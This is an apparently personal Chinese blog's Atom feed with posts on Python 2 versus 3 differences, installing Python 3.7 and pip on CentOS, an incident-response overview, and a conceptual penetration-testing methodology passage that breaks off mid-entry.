<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DiZai</title>
  
  <subtitle>Just do IT</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-09-03T15:32:54.915Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>迪仔</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python2.x与3.x版本区别</title>
    <link href="http://yoursite.com/2018/09/03/Python2-x%E4%B8%8E3%E2%80%8B%E2%80%8B-x%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB/"/>
    <id>http://yoursite.com/2018/09/03/Python2-x与3​​-x版本区别/</id>
    <published>2018-09-03T15:22:21.000Z</published>
    <updated>2018-09-03T15:32:54.915Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-【前言】"><a href="#0x01-【前言】" class="headerlink" title="0x01 【前言】"></a>0x01 【前言】</h2><p>Python的3.0版本，常被称为Python 3000，或简称Py3k。相对于Python的早期版本，这是一个较大的升级。</p><p>为了不带入过多的累赘，Python 3.0在设计的时候没有考虑向下相容。</p><a id="more"></a><p>许多针对早期Python版本设计的程式都无法在Python 3.0上正常执行。</p><p>为了照顾现有程式，Python 2.6作为一个过渡版本，基本使用了Python 2.x的语法和库，同时考虑了向Python 3.0的迁移，允许使用部分Python 3.0的语法与函数。</p><p>新的Python程式建议使用Python 3.0版本的语法。</p><p>除非执行环境无法安装Python 3.0或者程式本身使用了不支援Python 3.0的第三方库。目前不支援Python 3.0的第三方库有Twisted, py2exe, PIL等。</p><p>大多数第三方库都正在努力地相容Python 3.0版本。即使无法立即使用Python 3.0，也建议编写相容Python 3.0版本的程式，然后使用Python 2.6, Python 2.7来执行。</p><h2 id="0x02-【差异点】"><a href="#0x02-【差异点】" class="headerlink" title="0x02 【差异点】"></a>0x02 【差异点】</h2><h3 id="print函数代替了print语句"><a href="#print函数代替了print语句" class="headerlink" title="print函数代替了print语句"></a>print函数代替了print语句</h3><p>在Python 2.x中，输出语句使用的是print语句。 </p><p>但是在Python 3.x中，print语句没有了，取而代之的是print函数。 </p><p><strong>Python 2.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print (3, 4) </span><br><span class="line">(3, 4)</span><br></pre></td></tr></table></figure></p><p><strong>Python 3.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(3, 4) </span><br><span class="line">3 4</span><br></pre></td></tr></table></figure></p><h3 id="Python-3-x默认使用UTF-8编码"><a href="#Python-3-x默认使用UTF-8编码" class="headerlink" title="Python 3.x默认使用UTF-8编码"></a>Python 3.x默认使用UTF-8编码</h3><p>Python 2.x中有ASCII Str(）类型，unicode()是单独的，不是byte类型。 </p><p>在Python 3.X版本的源代码中，默认使用的是UTF-8编码，从而可以很好地支持中文或其他非英文字符。 </p><p>例如，输出一句中文，使用Python 2.x和Python 3.x的输出结果如下所示： </p><p><strong>Python 2.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str = &apos;迪仔加油啊&apos;</span><br><span class="line">&gt;&gt;&gt; str</span><br><span class="line">&apos;\xe8\xbf\xaa\xe4\xbb\x94\xe5\x8a\xa0\xe6\xb2\xb9\xe5\x95\x8a&apos;</span><br></pre></td></tr></table></figure></p><p><strong>Python 3.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str = &apos;迪仔加油啊&apos;</span><br><span class="line">&gt;&gt;&gt; str</span><br><span class="line">&apos;迪仔加油啊&apos;</span><br></pre></td></tr></table></figure></p><h3 id="除法运算"><a href="#除法运算" class="headerlink" title="除法运算"></a>除法运算</h3><p>和其他语言相比，Python语言的除法非常高端，它的除法运算包含两个元素安抚，分别是/和//，这两个运算符在Python 2.x和Python 3.x中的使用如下所示。</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符/"></a>运算符/</h3><p>在Python 2.x中，使用运算符/进行除法运算的方式和Java、C语言相似，整数相除的结果是一个整数，浮点数除法会保留小数点的部分得到一个浮点数的结果。 </p><p>在Python 3.x中使用运算符/进行除法运算，整数之前的相处，结果也会是浮点数。 </p><p><strong>Python 2.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1/2</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p><p><strong>Python 3.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1/2</span><br><span class="line">0.5</span><br></pre></td></tr></table></figure></p><h3 id="运算符-1"><a href="#运算符-1" class="headerlink" title="运算符//"></a>运算符//</h3><p>使用运算符//进行的除法叫做floor除法，这种除法会对除法的结果自动进行一个floor操作。使用这种运算符进行的除法运算，在Python 2.x和Python 3.x中是一致的。 </p><p>floor即获取不大于结果值的最大整数（向下取整）。 </p><p><strong>Python 2.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; -1//2</span><br><span class="line">-1</span><br></pre></td></tr></table></figure></p><p><strong>Python 3.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; -1//2</span><br><span class="line">-1</span><br></pre></td></tr></table></figure></p><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p><strong>异常处理改变的地方主要如下。</strong></p><table><thead><tr><th>区别点</th><th>Python 2.x</th><th>Python 3.x</th></tr></thead><tbody><tr><td>抛出的对象</td><td>直接抛出所有类型的对象</td><td>只有继承自BaseException的对象才可以被抛出</td></tr><tr><td>捕获异常的语法</td><td>except Exception, var</td><td>except Exception as var</td></tr><tr><td>异常处理的语法</td><td>raise Exception(args)</td><td>raise Exception, args</td></tr><tr><td>异常类的序列和.message属性</td><td>有</td><td>取消</td></tr></tbody></table><p><strong>Python 2.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try: </span><br><span class="line">...     raise TypeError,&quot;类型错误&quot; </span><br><span class="line">... except TypeError,err: </span><br><span class="line">...     print err.message </span><br><span class="line">...  类型错误</span><br></pre></td></tr></table></figure></p><h3 id="Python-3-x"><a href="#Python-3-x" class="headerlink" title="Python 3.x"></a><strong>Python 3.x</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try: </span><br><span class="line">...     raise TypeError(&quot;类型错误&quot;) </span><br><span class="line">... except TypeError as err: </span><br><span class="line">...     print(err) </span><br><span class="line">...  类型错误</span><br></pre></td></tr></table></figure><h3 id="八进制字面量表示"><a href="#八进制字面量表示" class="headerlink" title="八进制字面量表示"></a>八进制字面量表示</h3><p>在Python 3.x中，表示八进制字面量的方式只有一种，并且必须写成”0o1000”这样的方式，原来“01000”的方式不能使用了。 </p><p><strong>Python 2.X</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 01000 </span><br><span class="line">512 </span><br><span class="line">&gt;&gt;&gt; 0o1000 </span><br><span class="line">512</span><br></pre></td></tr></table></figure></p><p><strong>Pyhton 3.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 01000   </span><br><span class="line">File &quot;&lt;stdin&gt;&quot;, line 1     </span><br><span class="line">01000         </span><br><span class="line">  ^ </span><br><span class="line">SyntaxError: invalid token </span><br><span class="line">&gt;&gt;&gt; 0o1000 512</span><br></pre></td></tr></table></figure></p><h3 id="不等于运算符"><a href="#不等于运算符" class="headerlink" title="不等于运算符"></a>不等于运算符</h3><table><thead><tr><th>/</th><th>Python 2.x</th><th>Python 3.x</th></tr></thead><tbody><tr><td>不等于运算符的写法</td><td>两种，!=和&lt;&gt;</td><td>一种，只有！=</td></tr></tbody></table><p><strong>Python 2.X</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1 != 2 </span><br><span class="line">True </span><br><span class="line">&gt;&gt;&gt; 1 &lt;&gt; 2 </span><br><span class="line">True</span><br></pre></td></tr></table></figure></p><p><strong>Python 3.x</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1 != 2 </span><br><span class="line">True </span><br><span class="line">&gt;&gt;&gt; 1 &lt;&gt; 2   </span><br><span class="line">File &quot;&lt;stdin&gt;&quot;, line 1     </span><br><span class="line">1 &lt;&gt; 2  </span><br><span class="line">  ^ </span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li><p>Python 3.X去除了long类型，现在只有一种整型int,但它的行为就像是Python 2.X版本的Long</p></li><li><ul><li>Python 3.X新增了bytes类型，对应于Python 2.X版本的八位串，定义一个bytes字面量的方法如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b = b&apos;china&apos; </span><br><span class="line">&gt;&gt;&gt; type(b) </span><br><span class="line">&lt;class &apos;bytes&apos;&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>字符串对象和bytes对象可以使用.encode()(str-&gt;bytes)或者.decode()(bytes-&gt;str)方法相互转化。示例代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = b.decode() </span><br><span class="line">&gt;&gt;&gt; s &apos;china&apos; </span><br><span class="line">&gt;&gt;&gt; b1 = s.encode() </span><br><span class="line">&gt;&gt;&gt; b1 b&apos;china&apos;</span><br></pre></td></tr></table></figure></li><li><p>Python 3.X中，字典的keys()、items()、和values()方法用返回视图代替了列表，而2.x版本中的iterkeys()等函数都被废弃。同时去掉的还有has_key() 方法，用in替代。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-【前言】&quot;&gt;&lt;a href=&quot;#0x01-【前言】&quot; class=&quot;headerlink&quot; title=&quot;0x01 【前言】&quot;&gt;&lt;/a&gt;0x01 【前言】&lt;/h2&gt;&lt;p&gt;Python的3.0版本，常被称为Python 3000，或简称Py3k。相对于Python的早期版本，这是一个较大的升级。&lt;/p&gt;
&lt;p&gt;为了不带入过多的累赘，Python 3.0在设计的时候没有考虑向下相容。&lt;/p&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>在Linux中安全pip，可兼容Python 3.x</title>
    <link href="http://yoursite.com/2018/09/03/%E5%9C%A8Linux%E4%B8%AD%E5%AE%89%E5%85%A8pip%EF%BC%8C%E5%8F%AF%E5%85%BC%E5%AE%B9Python-3-x/"/>
    <id>http://yoursite.com/2018/09/03/在Linux中安全pip，可兼容Python-3-x/</id>
    <published>2018-09-03T14:05:25.000Z</published>
    <updated>2018-09-03T14:13:03.008Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-【前提】"><a href="#0x01-【前提】" class="headerlink" title="0x01 【前提】"></a>0x01 【前提】</h2><p>在CentOS7中，默认已经有了Python2.7的存在。直接输入python进入。<br>现在再安装一个python3.7。<br><a id="more"></a></p><h2 id="0x02-【过程】"><a href="#0x02-【过程】" class="headerlink" title="0x02 【过程】"></a>0x02 【过程】</h2><h3 id="一、安装Python3-7"><a href="#一、安装Python3-7" class="headerlink" title="一、安装Python3.7"></a>一、安装Python3.7</h3><p>前往<a href="https://www.python.org/downloads/source/" target="_blank" rel="noopener">https://www.python.org/downloads/source/</a>下载python3.7。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar .zxf Python-3.7.0.tar     //解压安装包</span><br><span class="line">cd Python-3.7.0      //进到python3目录  </span><br><span class="line">./configrue --prefix=/data/server/python/     //编译</span><br><span class="line">make &amp;&amp; make install      //安装</span><br><span class="line">ln /data/server/python/bin/python3.7 /usr/bin/python3     //创建软连接</span><br><span class="line">python3     //进入python3</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-87.png" alt="upload successful"></p><p><strong>安装完成！！</strong></p><h3 id="二、接着安装pip，通用的-Python-包管理工具。提供了对-Python-包的查找、下载、安装、卸载的功能。"><a href="#二、接着安装pip，通用的-Python-包管理工具。提供了对-Python-包的查找、下载、安装、卸载的功能。" class="headerlink" title="二、接着安装pip，通用的 Python 包管理工具。提供了对 Python 包的查找、下载、安装、卸载的功能。"></a>二、接着安装pip，通用的 Python 包管理工具。提供了对 Python 包的查找、下载、安装、卸载的功能。</h3><p>在网上下载pip-10.0.1.zip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unzip pip-10.0.1.zip</span><br><span class="line">cd pip-10.0.1/</span><br><span class="line">Python3 setup.py install     //安装</span><br><span class="line">python3 -m pip install requests    //在python3中安装模块</span><br><span class="line">python3 -m pip install lxml</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-88.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip instsall requests   //在python2中安装模块</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-89.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-【前提】&quot;&gt;&lt;a href=&quot;#0x01-【前提】&quot; class=&quot;headerlink&quot; title=&quot;0x01 【前提】&quot;&gt;&lt;/a&gt;0x01 【前提】&lt;/h2&gt;&lt;p&gt;在CentOS7中，默认已经有了Python2.7的存在。直接输入python进入。&lt;br&gt;现在再安装一个python3.7。&lt;br&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
      <category term="pip" scheme="http://yoursite.com/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="http://yoursite.com/2018/09/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>http://yoursite.com/2018/09/03/应急响应/</id>
    <published>2018-09-03T13:40:36.000Z</published>
    <updated>2018-09-03T13:51:05.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-应急响应的背景"><a href="#0x01-应急响应的背景" class="headerlink" title="0x01 应急响应的背景"></a>0x01 应急响应的背景</h2><h3 id="CERT-CC服务内容"><a href="#CERT-CC服务内容" class="headerlink" title="CERT/CC服务内容"></a>CERT/CC服务内容</h3><a id="more"></a><ul><li>安全事件响应</li><li>安全事件分析和软件安全缺陷研究</li><li>缺陷知识库开发</li><li>信息发布：缺陷、公告、总结、统计、补丁、工具</li><li>教育与培训：CSIRT管理、CSIRT技术培训、系统和网络管理员安全培训</li><li>指导其它CSIRT（也称IRT、CERT）组织建设。</li></ul><h2 id="0x02-应急响应的概念"><a href="#0x02-应急响应的概念" class="headerlink" title="0x02 应急响应的概念"></a>0x02 应急响应的概念</h2><h3 id="什么是应急响应？"><a href="#什么是应急响应？" class="headerlink" title="什么是应急响应？"></a>什么是应急响应？</h3><pre><code>是指组织为了应对突发/重大信息安全事件的发生所做的准备以及在事件发生后所采取的措施。</code></pre><h3 id="什么是安全事件？"><a href="#什么是安全事件？" class="headerlink" title="什么是安全事件？"></a>什么是安全事件？</h3><pre><code>安全事件则是指影响一个系统正常工作的情况。这里的系统包括主机范畴内的问题，也包括网络范畴内的问题，例如黑客入侵、信息窃取、拒绝服务攻击、网络流量异常等。</code></pre><h3 id="应急响应的描述"><a href="#应急响应的描述" class="headerlink" title="应急响应的描述"></a>应急响应的描述</h3><pre><code>客户的主机或网络正遭到攻击或发现入侵成功的痕迹，而又无法当时解决和追查来源时，安全服务商根据客户的要求以最快的速度赶到现场，协助客户解决问题，查找后门，保存证据和追查来源。</code></pre><h3 id="安全事件的分类（七类）："><a href="#安全事件的分类（七类）：" class="headerlink" title="安全事件的分类（七类）："></a>安全事件的分类（七类）：</h3><p>1、蠕虫类</p><p>2、网络攻击类：DOS、DDOS、扫描</p><p>3、信息破坏类：网站内容篡改</p><p>4、信息内容安全：</p><p>5、设备设施故障</p><p>6、自然灾害</p><p>7、其他</p><h3 id="应急响应的目的"><a href="#应急响应的目的" class="headerlink" title="应急响应的目的"></a>应急响应的目的</h3><ul><li>应急响应服务的目的是最快速度恢复系统的保密性、完整性和可用性，阻止和减小安全事件带来的影响。</li><li>应急响应服务的目的是尽可能地减小和控制住网络安全事件的损失，提供有效的响应和恢复指导，并努力防止安全事件的发生。</li></ul><p><img src="/images/pasted-86.png" alt="upload successful"></p><h3 id="应急响应服务的特点"><a href="#应急响应服务的特点" class="headerlink" title="应急响应服务的特点"></a>应急响应服务的特点</h3><ul><li><p>技术复杂性与专业性</p></li><li><p>知识经验的依赖性</p></li><li><p>事件突发性</p></li><li><p>协作能力</p></li></ul><h3 id="应急响应体系"><a href="#应急响应体系" class="headerlink" title="应急响应体系"></a>应急响应体系</h3><pre><code>是指在突发/重大信息安全事件后对包括计算机运行在内的业务运行进行维持或恢复的各种技术和管理策略和规程</code></pre><p>信息安全应急响应体系的制定是一个周而复始、持续改进的过程，包含以下几个阶段：</p><p>（1）应急响应需求分析和应急响应策略的确定；</p><p>（2）编制应急响应计划文档；</p><p>（3）应急响应计划的测试、培训、演练和维护</p><h2 id="0x03-应急响应组的组建"><a href="#0x03-应急响应组的组建" class="headerlink" title="0x03 应急响应组的组建"></a>0x03 应急响应组的组建</h2><h3 id="什么是应急响应组（IRT）"><a href="#什么是应急响应组（IRT）" class="headerlink" title="什么是应急响应组（IRT）"></a>什么是应急响应组（IRT）</h3><pre><code>应急响应组就是一个或更多的个人组成的团队，能快速执行和处理与安全有关的事件的任务。</code></pre><h3 id="为什么需要成立应急响应组"><a href="#为什么需要成立应急响应组" class="headerlink" title="为什么需要成立应急响应组"></a>为什么需要成立应急响应组</h3><ol><li>容易协调响应工作</li><li>提高专业知识</li><li>提高效率</li><li>提高先期主动防御能力</li><li>更加适合于满足机构的需要</li><li>提高联络功能</li><li>提高处理制度障碍方面的能力</li></ol><h3 id="应急响应相关行业规范"><a href="#应急响应相关行业规范" class="headerlink" title="应急响应相关行业规范"></a>应急响应相关行业规范</h3><pre><code>GB/T 24364-2009 《信息安全技术 信息安全应急响应计划规范》GB/T 20988-2007 《信息安全技术 信息系统应急响应规范》GB/Z 20985-2007 《信息技术 安全技术 信息安全事件管理指南》GB/Z 20986-2007 《信息安全技术 信息安全事件分类分级指南》</code></pre><h2 id="0x03-应急响应六个阶段："><a href="#0x03-应急响应六个阶段：" class="headerlink" title="0x03 应急响应六个阶段："></a>0x03 应急响应六个阶段：</h2><p><strong>准备（preparation）、检测(detection)、遏制(containment)、根除(eradication)、恢复(recovery)、跟踪(follow-up)   ——即PDCERF</strong></p><h3 id="第一阶段：准备——preparation"><a href="#第一阶段：准备——preparation" class="headerlink" title="第一阶段：准备——preparation"></a>第一阶段：准备——preparation</h3><p>准备阶段是安全事件响应的第一个阶段，在事件真正发生之前为事件响应做好相应的准备</p><p>比如，漏洞扫描、打补丁等，资源准备</p><h3 id="第二阶段：检测——detection"><a href="#第二阶段：检测——detection" class="headerlink" title="第二阶段：检测——detection"></a>第二阶段：检测——detection</h3><p>使用恰当的方法来确认系统或网络中是否出现了恶意代码、网络攻击、目录文件存在被篡改等异常现象</p><ul><li>事件标记</li><li><p>信息来源</p></li><li><p>开启审计</p></li><li>事件定级</li><li>响应方式</li></ul><h3 id="第三阶段：抑制——containment"><a href="#第三阶段：抑制——containment" class="headerlink" title="第三阶段：抑制——containment"></a>第三阶段：抑制——containment</h3><p>抑制攻击或破环波及的范围</p><p>建议组织机构为几类主要的事故建立单独的抑制策略，其标准包括：</p><p>潜在的破坏和资源的窃取</p><p>证据保留的需要</p><p>服务可用性（例如：网络连接，提供给外部当事方的服务）</p><p>实施战略需要的时间和资源</p><p>战略的有效性（例如：部分遏制事故，完全遏制事故）</p><p>解决方案的期限</p><h3 id="第四阶段：根除——eradication"><a href="#第四阶段：根除——eradication" class="headerlink" title="第四阶段：根除——eradication"></a>第四阶段：根除——eradication</h3><p>找到事件的根源彻底清除，防止攻击者再次使用相同的手段对系统或网络造成破坏，引发新的安全事件。</p><h3 id="第五阶段：恢复——recovery"><a href="#第五阶段：恢复——recovery" class="headerlink" title="第五阶段：恢复——recovery"></a>第五阶段：恢复——recovery</h3><p>业务恢复</p><h3 id="第六阶段：跟踪——follow-up"><a href="#第六阶段：跟踪——follow-up" class="headerlink" title="第六阶段：跟踪——follow-up"></a>第六阶段：跟踪——follow-up</h3><pre><code>关注系统恢复以后的安全状况，特别是曾经出问题的地方；建立跟踪文档，规范记录跟踪结果；对响应效果给出评估；对进入司法程序的事件，进行进一步的调查，打击违法犯罪活</code></pre><h2 id="0x04-应急响应预案制定"><a href="#0x04-应急响应预案制定" class="headerlink" title="0x04 应急响应预案制定"></a>0x04 应急响应预案制定</h2><h3 id="应急响应预案的包括的主要内容"><a href="#应急响应预案的包括的主要内容" class="headerlink" title="应急响应预案的包括的主要内容"></a>应急响应预案的包括的主要内容</h3><ul><li>确定风险场景</li><li>描述可能受到的业务影响</li><li>描述使用的预防性策略</li><li>描述应急响应策略</li><li>识别和排列关键应用系统</li><li>行动计划</li><li>团队和人员的职责</li><li>联络清单</li><li>所需资源配置</li></ul><h3 id="成功预案的特点"><a href="#成功预案的特点" class="headerlink" title="成功预案的特点"></a>成功预案的特点</h3><ul><li>清楚、简洁</li><li>高级管理层支持/组织承诺</li><li>不断改进和更新的恢复策略</li><li>及时的更新维护</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-应急响应的背景&quot;&gt;&lt;a href=&quot;#0x01-应急响应的背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 应急响应的背景&quot;&gt;&lt;/a&gt;0x01 应急响应的背景&lt;/h2&gt;&lt;h3 id=&quot;CERT-CC服务内容&quot;&gt;&lt;a href=&quot;#CERT-CC服务内容&quot; class=&quot;headerlink&quot; title=&quot;CERT/CC服务内容&quot;&gt;&lt;/a&gt;CERT/CC服务内容&lt;/h3&gt;
    
    </summary>
    
      <category term="安全运维" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="应急响应" scheme="http://yoursite.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试浅析</title>
    <link href="http://yoursite.com/2018/09/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%85%E6%9E%90/"/>
    <id>http://yoursite.com/2018/09/02/渗透测试浅析/</id>
    <published>2018-09-02T12:40:00.000Z</published>
    <updated>2018-09-02T14:11:05.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试（Penetration-testing-Pentest）"><a href="#渗透测试（Penetration-testing-Pentest）" class="headerlink" title="渗透测试（Penetration testing Pentest）"></a>渗透测试（Penetration testing Pentest）</h2><p>通过实际的攻击进行安全测试与评估的方法。</p><p>渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与相应过程中的操作性弱点等<br><a id="more"></a></p><h3 id="黑盒测试（Black-box-texting）"><a href="#黑盒测试（Black-box-texting）" class="headerlink" title="黑盒测试（Black-box texting）"></a>黑盒测试（Black-box texting）</h3><p>设计为模拟一个客户组织一无所知的攻击者所进行的渗透攻击</p><p>采用这种方式时，渗透测试团队将从一个远程网络未知来评估目标网络基础设施，并没有任何目标网络内部拓扑等相关信息，他们完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标组织进行逐步的渗透与入侵，揭示目标网络中的一些一直活的安全漏洞，并评估。黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。。费时费力 需要高技术  高逼格</p><h3 id="白盒测试（White-box-Testing）"><a href="#白盒测试（White-box-Testing）" class="headerlink" title="白盒测试（White-box Testing）"></a>白盒测试（White-box Testing）</h3><p>渗透测试者在拥有客户组织所有知识的情况下所进行的渗透测试。</p><p>以了解到关于目标环境的所有内部与底层知识 因此最小代价发现和验证系统中最严重的安全漏洞。</p><p>不需要情报收集 和目标定位  可以在部署和开发周期中进行集成</p><p>时间少代价低  最大的问题是无法有效的测试客户组织的应急响应程序 也无法判断出他们的安全防护计划对检测特定攻击的效率 </p><h3 id="灰盒测试（Grey-box）"><a href="#灰盒测试（Grey-box）" class="headerlink" title="灰盒测试（Grey-box）"></a>灰盒测试（Grey-box）</h3><p>黑白组合可以提供对目标系统更加深入和全面的安全审查</p><h3 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h3><h4 id="安全测试方法学开源手册（ossmm）"><a href="#安全测试方法学开源手册（ossmm）" class="headerlink" title="安全测试方法学开源手册（ossmm）"></a>安全测试方法学开源手册（ossmm）</h4><p>物理安全、人类心理学、数据网络、无线通信媒介和电讯通信五类用例。</p><h3 id="网络安全测试指南（NIST-SP-800-42）"><a href="#网络安全测试指南（NIST-SP-800-42）" class="headerlink" title="网络安全测试指南（NIST SP 800-42）"></a>网络安全测试指南（NIST SP 800-42）</h3><h4 id="OWASP十大Web应用安全威胁项目-："><a href="#OWASP十大Web应用安全威胁项目-：" class="headerlink" title="OWASP十大Web应用安全威胁项目 ："></a>OWASP十大Web应用安全威胁项目 ：</h4><p>owasp top 10 只关注具有最高风险的Web领域，不是一个普适性的渗透测试方法指南。</p><h4 id="Web安全威胁分类标准（WASC-TC）"><a href="#Web安全威胁分类标准（WASC-TC）" class="headerlink" title="Web安全威胁分类标准（WASC-TC）"></a>Web安全威胁分类标准（WASC-TC）</h4><p>全面地给出目前web领域中的漏洞、攻击与防范措施视图。</p><h3 id="完整方法论：PTES渗透测试执行标准（渗透测试7个阶段）"><a href="#完整方法论：PTES渗透测试执行标准（渗透测试7个阶段）" class="headerlink" title="完整方法论：PTES渗透测试执行标准（渗透测试7个阶段）"></a>完整方法论：PTES渗透测试执行标准（渗透测试7个阶段）</h3><p><strong>一、前期交互阶段（Pre-Engagement Interaction）</strong></p><p>渗透测试团队与客户组织进行交互讨论，最重要的是确定测试范围、目标、限制条件以及服务合同细节。该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动</p><p><strong>二、情报收集阶段（Information Gathering）    Google Hacking</strong></p><p>在目标范围确定后，渗透测试团队可以利用各种信息来源与收集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。</p><p>渗透测试者可以使用的情报搜集方法包括公开来源的信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务检查等。对目标系统的情报探查能力是渗透测试者一项非常重要的技能，情报搜集是否充分在很大程度上决定了渗透测试的成败，因为如果你遗漏关键的情报信息，你将有可能在后面的阶段里一无所获。</p><p><strong>三、威胁建模阶段(Threat Modeling)</strong></p><p>在搜集到充分的情报信息之后，渗透测试团队的成员们停下敲击键盘，大家聚集到一起针对获取的信息进行威胁建模与攻击规划。这是渗透测试过程中非常重要，但很容易被忽视的一个关键点。</p><p>通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道。</p><p><strong>四、漏洞分析阶段(Vulnerablity Analysis)    Exp：渗透代码    